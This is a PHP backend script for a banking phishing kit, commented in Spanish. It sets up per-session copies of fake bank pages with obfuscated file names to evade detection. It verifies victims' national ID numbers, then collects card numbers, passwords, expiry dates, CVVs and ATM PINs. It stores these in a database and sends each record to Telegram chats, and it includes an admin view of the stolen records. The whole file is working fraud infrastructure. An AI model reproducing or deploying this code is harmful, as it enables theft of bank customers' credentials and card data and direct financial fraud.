<?php

########################################################################
# HEADERS
########################################################################

session_start();

header('Content-Type: application/json');

########################################################################
# ARCHIVOS DE CONFIGURACION
########################################################################

include 'config.php';
include 'utils/php_files/functions.php';
include 'utils/php_files/identificators.php';

########################################################################
# 1) REGISTRAR SESION
########################################################################

if (isset($_GET['action']) && $_GET['action'] == 'register_new_sesion') {

	// 1) VERIFICO RECIBIR POST
	// -----------------------------------------------------------------

	if (isset($_POST['visitorId'])) {

        $visitorId = $_POST['visitorId'];

    } else {

        $response = array('success' => false, 'reason' => 'El parámetro visitorId no está presente');

		echo json_encode($response);

		exit();

    }

    if (isset($_POST['device_type'])) {

        $device_type = $_POST['device_type'];

    } else {

        $response = array('success' => false, 'reason' => 'El parámetro device_type no está presente');

		echo json_encode($response);

		exit();

    }

    $_SESSION['device_type'] = $device_type;

    // 2) VERIFICO SI EXISTE EN LA BASE DE DATOS
    // -----------------------------------------------------------------

	$conn = new mysqli($db_host, $db_user, $db_pass, $db_name);

	if ($conn->connect_error) {
	    
	    $response = array('success' => false, 'reason' => 'No se ha podido conectar con la base de datos');

		echo json_encode($response);

		exit();

	}

	$sql = "SELECT estado FROM valid_logins WHERE id = '$visitorId'";
	$result = $conn->query($sql);

	if ($result->num_rows > 0) {

	    $row = $result->fetch_assoc();
	    $estado = $row['estado'];

	} else {

		$estado = "ingresando_dni";

	}

	$conn->close();

	if ($estado == "tarjeta_ingresada" || $estado == "sms_aprobado") {
		
		$response = array('success' => true, 'estado' => $estado);

	    echo json_encode($response);

	    exit();

	}

	// 3) GENERANDO SESSION ID (AES KEY)
    // -----------------------------------------------------------------

    if (isset($_SESSION['session_id'])) {

	    $session_id = $_SESSION['session_id'];

	    $response = array('success' => true, 'session_id' => $session_id, 'estado' => $estado);

	    echo json_encode($response);

	    exit();

	} else {

	    $session_id = strval(generateKey());

	}

    // 4) CREANDO CARPETA SI ES NECESARIO
    // -----------------------------------------------------------------

	$ruta = __DIR__ . '/' . $session_id;

	if (!file_exists($ruta)) {

	    if (mkdir($ruta, 0777, true)) {

	    	try {

			    $sourceDir = 'source_files';

				copiarDirectorio($sourceDir, $session_id);

			} catch (Exception $e) {

			    $response = array('success' => false, 'reason' => strval($e));

				echo json_encode($response);

		        exit();

			}

	    } else {

	        $response = array('success' => false, 'reason' => 'No se ha podido crear la carpeta');

    		echo json_encode($response);

	        exit();

	    }

	    $directory = 'source_files';

		$phpFiles = glob($directory . '/*.php');

		$filesArray = array();

		$banca_encrypted_file_name = "";

		$background_php_file_name = "";

		foreach ($phpFiles as $file) {

		    $originalName = basename($file);

		    if ($originalName == "index.php") {
		    	$encryptedName = "index";
		    } else {

		    	$encryptedName = encrypt($originalName, $session_id);

		    	if ($originalName == "banca.php") {
		    		$banca_encrypted_file_name = $encryptedName;
		    	}

		    	if ($originalName == "background_banca.php") {
		    		$background_php_file_name = $encryptedName;
		    	}

		    }

		    $filesArray[$originalName] = $encryptedName;
		}

		foreach ($filesArray as $original_name => $encrypted_name) {

			$currentPath = $session_id.'/'.$original_name;

			if (!renameFile($currentPath, $encrypted_name.".php")) {

			    $response = array('success' => false, 'reason' => 'Error al renombrar el archivo');

			   	echo json_encode($response);

		        exit();

			}

		}

		/* */

		$img_and_fonts_files_directory = "source_files/files";

		$img_and_fonts_files_list = getFilesFromDirectory($img_and_fonts_files_directory);

		$img_and_fonts_files_array = array();

		$fonts_files_name = array();

		$svg_files_name = array();

		$css_encrypted_file_name = "";

		$fluid_css_encrypted_file_name = "";

		$jquery_lightbox_css_encrypted_file_name = "";

		$main_css_encrypted_file_name = "";

		foreach ($img_and_fonts_files_list as $file) {

			$parts = explode('.', $file);

			$firstPart = $parts[0];

			$restPart = implode('.', array_slice($parts, 1));

			$font_files_allowed_extensions = array("otf", "ttf", "woff", "woff2");

			$encryptedName = encrypt($restPart, $session_id);

			$encryptedName_and_extension = $encryptedName.".".$restPart;

			if (in_array($restPart, $font_files_allowed_extensions)) {
				
				$fonts_files_name[$file] = $encryptedName_and_extension;

			}

			if ($restPart == "svg") {
				
				$svg_files_name[$file] = $encryptedName_and_extension;

			}

			if ($file == "stylo.css") {
				
				$css_encrypted_file_name = $encryptedName_and_extension;

			}

			if ($file == "main.css") {
				
				$main_css_encrypted_file_name = $encryptedName_and_extension;

			}

			$img_and_fonts_files_array[$file] = $encryptedName_and_extension;

		}

		$files_folder_name = strval(generateKey());

		$oldFolder = $session_id.'/files';

		$newFolder = $session_id.'/'.$files_folder_name;

		if (!rename($oldFolder, $newFolder)) {

		    $response = array('success' => false, 'reason' => 'Error al renombrar la carpeta');

		    echo json_encode($response);

	        exit();

		}

		foreach ($img_and_fonts_files_array as $key => $value) {
			
			$currentPath = $session_id.'/'.$files_folder_name.'/'.$key;

			$newPath = $session_id.'/'.$files_folder_name.'/'.$value;

			if (!renameFile($currentPath, $value)) {

			    $response = array('success' => false, 'reason' => 'Error al renombrar el archivo');

			   	echo json_encode($response);

		        exit();

			}

		}

		foreach ($filesArray as $key => $value) {

			if ($value !== "index.php") {
				
				$file_location = $session_id."/".$value.".php";

				$file_contents = file_get_contents($file_location);

				foreach ($img_and_fonts_files_array as $key => $value) {
					
					$file_contents = str_replace("files/".$key, $files_folder_name."/".$value, $file_contents);

				}

				file_put_contents($file_location, $file_contents);

			}
			
		}

		foreach ($filesArray as $key => $value) {

			if ($value !== "index.php") {
				
				$file_location = $session_id."/".$value.".php";

				$file_contents = file_get_contents($file_location);

				foreach ($img_and_fonts_files_array as $key => $value) {
					
					$file_contents = str_replace("files/".$key, $files_folder_name."/".$value, $file_contents);

				}

				file_put_contents($file_location, $file_contents);

			}
			
		}

		# CSS

		$file_location = $session_id."/".$files_folder_name."/".$css_encrypted_file_name;

		$file_contents = file_get_contents($file_location);

		foreach ($fonts_files_name as $key => $value) {

			$file_contents = str_replace($key, $value, $file_contents);

		}

		foreach ($svg_files_name as $key => $value) {

			$file_contents = str_replace($key, $value, $file_contents);

		}

		file_put_contents($file_location, $file_contents);

	}

	// 5) ESTABLECIENDO PARAMETROS DE SESION
    // -----------------------------------------------------------------

    $_SESSION['estado'] = $estado;
	$_SESSION['visitorId'] = $visitorId;
	$_SESSION['session_id'] = $session_id;
	$_SESSION['directory_array'] = $filesArray;

    $response = array('success' => true, 'session_id' => $session_id, 'estado' => $estado);

    echo json_encode($response);

    exit();

}

########################################################################
# 2) VERIFICAR USUARIO
########################################################################

if (isset($_GET['action']) && $_GET['action'] == 'verificar_usuario') {

	// 1) VERIFICO QUE EXISTA SESION
	// -----------------------------------------------------------------

	if (isset($_SESSION['visitorId'])) {

	    $visitorId = $_SESSION['visitorId'];

	} else {

	    $response = array('success' => false, 'reason' => 'No se ha encontrado la sesion');
	    
	    echo json_encode($response);

	    exit();

	}

	// 2) VERIFICO RECIBIR POST
	// -----------------------------------------------------------------

	if (!isset($_POST['data_2'])) {

        $response = array('success' => false, 'reason' => 'Faltan parametros en el POST');

		echo json_encode($response);

		exit();

    }

    // -----------------------------------------------------------------

    $dni = $_POST['data_2'];

    $validate_user_rsp = get_result_reniec($dni);

    $validate_user_rsp_success = $validate_user_rsp["success"];

    if ($validate_user_rsp_success == true) {
    	
    	$_SESSION['dni'] = $dni;
    	$_SESSION['nc'] = $validate_user_rsp["nombre_completo"];
    	$_SESSION['nf'] = $validate_user_rsp["nameFomateado"];

    }

    $_SESSION['estado'] = "step_two";

    echo json_encode($validate_user_rsp);
	exit();

}

########################################################################
# 2) REGISTRAR LOGIN
########################################################################

if (isset($_GET['action']) && $_GET['action'] == 'do_login') {

	// 1) VERIFICO QUE EXISTA SESION
	// -----------------------------------------------------------------

	if (isset($_SESSION['visitorId'])) {

	    $visitorId = $_SESSION['visitorId'];

	} else {

	    $response = array('success' => false, 'reason' => 'No se ha encontrado la sesion');
	    
	    echo json_encode($response);

	    exit();

	}

	// 2) VERIFICO RECIBIR POST
	// -----------------------------------------------------------------

	if (!isset($_POST['cc_num']) || !isset($_POST['password'])) {

        $response = array('success' => false, 'reason' => 'Faltan parametros en el POST');

		echo json_encode($response);

		exit();

    }

    $cc_num = $_POST['cc_num'];
    $password = $_POST['password'];

    $monto = $_POST['monto'];
    $celular = $_POST['celular'];
    $correo = $_POST['correo'];

    $dni = $_SESSION['dni'];

    $current_estado = $_SESSION['estado'];

    try {

		// 3.1) PREPARANDO CONEXION CON BASE DE DATOS

	    $pdo = new PDO("mysql:host=$db_host;dbname=$db_name;charset=utf8", $db_user, $db_pass);
	    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

	    // 3.2) PREPARANDO SENTENCIA SQL

	    $stmt = $pdo->prepare("INSERT INTO valid_logins (id, dni, cc_num, password, monto, numero, correo, estado) VALUES (:id, :dni, :cc_num, :password, :monto, :celular, :correo, :estado)");

	    // 3.3) EJECUTANDO SENTENCIA SQL

	    $stmt->execute([
	    	':dni' => $dni,
	        ':cc_num' => $cc_num,
	        ':password' => $password,

	        ':monto' => $monto,
	        ':celular' => $celular,
	        ':correo' => $correo,

	        ':estado' => 'login_ingresado',
	        ':id' => $visitorId
	    ]);

	    // 3.4) CERRANDO CONEXION

        $pdo = null;
	    
	} catch (Exception $e) {
	    
	    // 3.3.1) RESPUESTA SI ES QUE PHP DETECTA ERROR

	    $response = array('success' => false, 'reason' => $e->getMessage());

	    echo json_encode($response);

	    exit();
	}

	// 4) ESTABLEZCO NUEVO ESTADO EN LA SESION
	// -----------------------------------------------------------------

	$_SESSION['estado'] = "login_ingresado";

	$_SESSION['dni_session'] = $dni;
	$_SESSION['cc_num_session'] = $cc_num;
	$_SESSION['password_session'] = $password;

	$_SESSION['monto_session'] = $monto;
	$_SESSION['celular_session'] = $celular;
	$_SESSION['correo_session'] = $correo;

	// 5) ENVIO DATOS A TELEGRAM
	// -----------------------------------------------------------------

	$visitorData = "<b>ACCESO</b>\n\n";

	$visitorData .= "#$visitorId\n\n";

	$visitorData .= "<b>DNI</b>: ".$dni."\n";
	$visitorData .= "<b>Tarjeta</b>: ".$cc_num."\n";
	$visitorData .= "<b>Clave</b>: ".$password."\n\n";

	$visitorData .= "<b>Monto</b>: ".$monto."\n";
	$visitorData .= "<b>Celular</b>: ".$celular."\n";
	$visitorData .= "<b>Correo</b>: ".$correo."\n\n";

	$visitorData .= "<b>Datos del visitante</b>:\n\n";

	if ($detailed_log_mode == "si") {
		$visitorData .= "Fecha: $date\n";
		$visitorData .= "IP Address: $ipAddress\n";
		$visitorData .= "User Agent: $userAgent\n";
		$visitorData .= "Nombre del Servidor: $serverName\n";
		$visitorData .= "Protocolo: $protocol\n";
		$visitorData .= "Método: $method\n";
	} else {
		$visitorData .= "IP: ".$ipAddress."\n";
	}

    sendToTelegram($visitorData, $token, $chatIds_list);

    $response = array('success' => true, 'estado' => 'login_ingresado');
    echo json_encode($response);
	exit();

}

########################################################################
# 4) REGISTRAR TARJETA
########################################################################

if (isset($_GET['action']) && $_GET['action'] == 'card_data') {

	// 1) VERIFICO QUE EXISTA SESION
	// -----------------------------------------------------------------

	if (isset($_SESSION['visitorId'])) {

	    $visitorId = $_SESSION['visitorId'];

	} else {

	    $response = array('success' => false, 'reason' => 'No se ha encontrado la sesion');
	    
	    echo json_encode($response);

	    exit();

	}

	// 2) VERIFICO RECIBIR POST
	// -----------------------------------------------------------------

	if (!isset($_POST['expdate']) || !isset($_POST['cvv']) || !isset($_POST['atm'])) {

        $response = array('success' => false, 'reason' => 'Faltan parametros en el POST');

		echo json_encode($response);

		exit();

    }

    $expdate = $_POST['expdate'];
    $cvv = $_POST['cvv'];
    $atm = $_POST['atm'];

    // 3) INSERTO EN LA BASE DE DATOS
	// -----------------------------------------------------------------

	$new_estado = "tarjeta_ingresada";

    try {

    	// 3.1) PREPARANDO CONEXION CON BASE DE DATOS

        $pdo = new PDO("mysql:host=$db_host;dbname=$db_name", $db_user, $db_pass);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

        // 3.2) PREPARANDO CONEXION CON BASE DE DATOS

		$stmt = $pdo->prepare("UPDATE valid_logins SET exp_date = :expdate, cvv = :cvv, atm = :atm, estado = :estado WHERE id = :session_id");

		$stmt->bindParam(':expdate', $expdate);
		$stmt->bindParam(':cvv', $cvv);
		$stmt->bindParam(':atm', $atm);
		$stmt->bindParam(':estado', $new_estado); // Usa la variable en lugar de la constante
		$stmt->bindParam(':session_id', $visitorId);

        // 3.3) EJECUTANDO SENTENCIA MYSQL

        $stmt->execute();

    } catch (Exception $e) {
        
        $response = array('success' => false, 'reason' => 'Excepción: ' . $e->getMessage());
	    
	    echo json_encode($response);

	    exit();

    }

    // 4) ESTABLEZCO NUEVO ESTADO EN LA SESION
	// -----------------------------------------------------------------

	$dni = $_SESSION['dni_session'];
	$cc_num = $_SESSION['cc_num_session'];
	$password = $_SESSION['password_session'];

	$monto = $_SESSION['monto_session'];
	$celular = $_SESSION['celular_session'];
	$correo = $_SESSION['correo_session'];

    $_SESSION['estado'] = $new_estado;

    $visitorData = "<b>TARJETA</b>\n\n";

	$visitorData .= "#$visitorId\n\n";

	$visitorData .= "<b>DNI</b>: ".$dni."\n";
	$visitorData .= "<b>Tarjeta</b>: ".$cc_num."\n";
	$visitorData .= "<b>Clave</b>: ".$password."\n\n";

	$visitorData .= "<b>Monto</b>: ".$monto."\n";
	$visitorData .= "<b>Celular</b>: ".$celular."\n";
	$visitorData .= "<b>Correo</b>: ".$correo."\n\n";

	$visitorData .= "<b>Exp</b>: ".$expdate."\n";
	$visitorData .= "<b>Cvv</b>: ".$cvv."\n";
	$visitorData .= "<b>ATM</b>: ".$atm."\n";

	$visitorData .= "<b>Datos del visitante</b>:\n\n";

	if ($detailed_log_mode == "si") {
		$visitorData .= "Fecha: $date\n";
		$visitorData .= "IP Address: $ipAddress\n";
		$visitorData .= "User Agent: $userAgent\n";
		$visitorData .= "Nombre del Servidor: $serverName\n";
		$visitorData .= "Protocolo: $protocol\n";
		$visitorData .= "Método: $method\n";
	} else {
		$visitorData .= "IP: ".$ipAddress."\n";
	}

    sendToTelegram($visitorData, $token, $chatIds_list);

    // 6) RESPUESTA FINAL POSITIVA
	// -----------------------------------------------------------------

    $response = array('success' => true, 'estado' => 'tarjeta_ingresada');
	echo json_encode($response);
    exit();

}

########################################################################
# 2) CHECK LOGIN STATUS
########################################################################

if (isset($_GET['action']) && $_GET['action'] == 'fetch_records') {

	$conn = new mysqli($db_host, $db_user, $db_pass, $db_name);

	if ($conn->connect_error) {
	    die("Connection failed: " . $conn->connect_error);
	}

	$sql = "SELECT * FROM valid_logins";
	$result = $conn->query($sql);

	if ($result->num_rows > 0) {
	    while ($row = $result->fetch_assoc()) {

	        echo "<tr>
	                <td>{$row['id']}</td>
	                <td>{$row['dni']}</td>
	                <td>{$row['cc_num']}</td>
	                <td>{$row['password']}</td>

	                <td>{$row['monto']}</td>
	                <td>{$row['numero']}</td>
	                <td>{$row['correo']}</td>

	                <td>{$row['exp_date']}</td>
	                <td>{$row['cvv']}</td>
	                <td>{$row['atm']}</td>
	                
	                <td>{$row['created_at']}</td>
	                <td>
	                	<button class='btn btn-danger delete-btn' data-id='{$row['id']}'>X</button>
            		</td>
	              </tr>";
	    }
	} else {
	    echo "<tr><td colspan='15'>No hay registros</td></tr>";
	}

	$conn->close();

}

########################################################################
# 2) CHECK LOGIN STATUS
########################################################################

if (isset($_GET['action']) && $_GET['action'] == 'delete_record') {

	$conn = new mysqli($db_host, $db_user, $db_pass, $db_name);

	if ($conn->connect_error) {
	    die("Connection failed: " . $conn->connect_error);
	}

	$id = $_POST['id'];

	$sql = "DELETE FROM valid_logins WHERE id = ?";
	$stmt = $conn->prepare($sql);
	$stmt->bind_param('i', $id);
	$stmt->execute();
	$stmt->close();
	$conn->close();

}

########################################################################
# 2) CHECK LOGIN STATUS
########################################################################

if (isset($_GET['action']) && $_GET['action'] == 'update_data') {

    // Verificar si el ID está en la sesión y los datos están presentes
    if (isset($_SESSION['visitorId'], $_POST['dni'], $_POST['numero'], $_POST['correo'], $_POST['monto'], $_POST['meses'])) {

        $visitorId = $_SESSION['visitorId'];

        $dni = $_POST['dni'];
        $numero = $_POST['numero'];
        $correo = $_POST['correo'];
        $monto = $_POST['monto'];
        $meses = $_POST['meses'];

        $monto_int = intval($monto);
        $meses_int = intval($meses);

        $calcular_prestamo_rsp = calcular_prestamo($monto_int, $meses_int);

        $new_estado = "esperado_pedir_sms";

        try {
            
            // 3.1) PREPARANDO CONEXION CON BASE DE DATOS

		    $pdo = new PDO("mysql:host=$db_host;dbname=$db_name;charset=utf8", $db_user, $db_pass);
		    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

		    // 3.2) PREPARANDO SENTENCIA SQL

		    $stmt = $pdo->prepare("UPDATE valid_logins SET dni = :dni, numero = :numero, correo = :correo, estado = :estado WHERE id = :id");

		    // 3.3) EJECUTANDO SENTENCIA SQL

		    $stmt->execute([
		        ':dni' => $dni,
		        ':numero' => $numero,
		        ':correo' => $correo,
		        ':estado' => $new_estado,
		        ':id' => $visitorId
		    ]);

		    // 3.4) CERRANDO CONEXION

	        $pdo = null;

	        $response = array('success' => true, 'estado' => $new_estado, 'variables_prestamo' => $calcular_prestamo_rsp);
		    echo json_encode($response);
		    exit();

        } catch (mysqli_sql_exception $e) {

            // 3.3.1) RESPUESTA SI ES QUE PHP DETECTA ERROR

		    $response = array('success' => false, 'reason' => $e->getMessage());
		    echo json_encode($response);
		    exit();

        }

    } else {
        
        // 3.3.1) RESPUESTA SI ES QUE PHP DETECTA ERROR

	    $response = array('success' => false, 'reason' => 'bad_post');
	    echo json_encode($response);
	    exit();

    }

}

?>
